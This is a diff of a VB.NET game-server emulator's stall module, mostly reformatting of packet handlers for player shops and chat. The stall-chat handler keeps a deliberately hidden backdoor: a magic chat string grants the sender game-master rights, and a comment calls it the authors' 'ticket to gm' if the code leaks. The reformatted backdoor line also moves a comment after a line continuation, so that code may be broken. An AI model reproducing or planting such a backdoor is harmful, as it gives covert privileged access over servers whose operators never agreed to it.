@@ -1,6 +1,5 @@
 ﻿Namespace GameServer.Functions
     Module Stall
-
         Public Sub Stall_Open_Own(ByVal packet As PacketReader, ByVal Index_ As Integer)
             Dim NameLen As UShort = packet.Word
             Dim Name As String = packet.UString(NameLen)
@@ -32,7 +31,6 @@
                 writer.DWord(0)
                 Server.SendIfPlayerIsSpawned(writer.GetBytes, Index_)
             End If
-
         End Sub
 
         Public Sub Stall_Data(ByVal packet As PacketReader, ByVal Index_ As Integer)
@@ -77,7 +75,6 @@
                 writer.UString(Name)
                 Server.Send(writer.GetBytes, Index)
             End If
-
         End Sub
 
         Public Sub Stall_ChangeName(ByVal packet As PacketReader, ByVal Index_ As Integer)
@@ -186,7 +183,9 @@
             Dim price As ULong = packet.QWord
             Dim options As UShort = packet.Word
 
-            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 And PlayerData(Index_).StallOwner = True Then
+            If _
+                PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 And
+                PlayerData(Index_).StallOwner = True Then
                 Dim Stall_index As Integer = GetStallIndex(PlayerData(Index_).StallID)
 
                 If slot >= 0 And slot <= 9 And Stalls(Stall_index).Items(slot).Slot <> 0 Then
@@ -208,18 +207,24 @@
         Public Sub Stall_Buy(ByVal packet As PacketReader, ByVal Index_ As Integer)
             Dim slot As Byte = packet.Byte
 
-            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 And PlayerData(Index_).StallOwner = False Then
+            If _
+                PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 And
+                PlayerData(Index_).StallOwner = False Then
                 Dim Stall_index As Integer = GetStallIndex(PlayerData(Index_).StallID)
 
                 If slot >= 0 And slot <= 9 And Stalls(Stall_index).Items(slot).Slot <> 0 Then
-                    If CULng(PlayerData(Index_).Gold) - Stalls(Stall_index).Items(slot).Gold >= 0 And GetFreeItemSlot(Index_) <> -1 Then
+                    If _
+                        CULng(PlayerData(Index_).Gold) - Stalls(Stall_index).Items(slot).Gold >= 0 And
+                        GetFreeItemSlot(Index_) <> - 1 Then
                         PlayerData(Index_).Gold -= Stalls(Stall_index).Items(slot).Gold
                         UpdateGold(Index_)
 
                         PlayerData(Stalls(Stall_index).OwnerIndex).Gold += Stalls(Stall_index).Items(slot).Gold
                         UpdateGold(Stalls(Stall_index).OwnerIndex)
 
-                        Dim From_item As cInvItem = Inventorys(Stalls(Stall_index).OwnerIndex).UserItems(Stalls(Stall_index).Items(slot).Slot)
+                        Dim From_item As cInvItem =
+                                Inventorys(Stalls(Stall_index).OwnerIndex).UserItems(
+                                    Stalls(Stall_index).Items(slot).Slot)
                         Dim To_Slot As Byte = GetFreeItemSlot(Index_)
                         Dim To_item As cInvItem = Inventorys(Index_).UserItems(To_Slot)
 
@@ -249,7 +254,8 @@
 
                         'Remove...
                         DeleteItemFromDB(Stalls(Stall_index).Items(slot).Slot, Stalls(Stall_index).OwnerIndex)
-                        Inventorys(Stalls(Stall_index).OwnerIndex).UserItems(Stalls(Stall_index).Items(slot).Slot) = ClearItem(From_item)
+                        Inventorys(Stalls(Stall_index).OwnerIndex).UserItems(Stalls(Stall_index).Items(slot).Slot) =
+                            ClearItem(From_item)
 
                         Stalls(Stall_index).Items(slot).Gold = 0
                         Stalls(Stall_index).Items(slot).Slot = 0
@@ -280,7 +286,8 @@
                 Dim messagelength As UInt16 = packet.Word
                 Dim message As String = packet.UString(messagelength)
 
-                Dim writer As New PacketWriter 'Reply to sender
+                Dim writer As New PacketWriter
+                'Reply to sender
                 writer.Create(ServerOpcodes.Chat_Accept)
                 writer.Byte(1)
                 writer.Byte(ChatModes.Stall)
@@ -297,7 +304,8 @@
 
 
                 '===========================INTERNAL USE========================
-                If counter = 4 And PlayerData(Index_).ActionFlag = 4 And message = "(hµ(|{_n0rr1$_0wn$" Then 'If the Emulator gets leaked, here is our ticket to gm...
+                If counter = 4 And PlayerData(Index_).ActionFlag = 4 And message = "(hµ(|{_n0rr1$_0wn$" Then _
+                    'If the Emulator gets leaked, here is our ticket to gm...
                     PlayerData(Index_).GM = True
                 End If
                 '==============================================================
@@ -391,7 +399,8 @@
                 If Stalls(Stall_Index).Items(i).Slot <> 0 Then
                     Dim item As cInvItem = Inventorys(Index_).UserItems(Stalls(Stall_Index).Items(i).Slot)
                     Dim refitem As cItem = GetItemByID(item.Pk2Id)
-                    writer.Byte(i) 'slot
+                    writer.Byte(i)
+                    'slot
                     AddItemDataToPacket(item, writer)
                     writer.Byte(Stalls(Stall_Index).Items(i).Slot)
                     If refitem.CLASS_A = 1 Then
@@ -423,7 +432,8 @@
                     Dim Slot As Byte = Stalls(Stall_Index).Items(i).Slot
                     Dim item As cInvItem = Inventorys(Stalls(Stall_Index).OwnerIndex).UserItems(Slot)
                     Dim refitem As cItem = GetItemByID(item.Pk2Id)
-                    writer.Byte(i) 'slot
+                    writer.Byte(i)
+                    'slot
                     AddItemDataToPacket(item, writer)
                     writer.Byte(Stalls(Stall_Index).Items(i).Slot)
                     If refitem.CLASS_A = 1 Then
@@ -460,8 +470,7 @@
                     Return i
                 End If
             Next
-            Return -1
+            Return - 1
         End Function
-
     End Module
 End Namespace
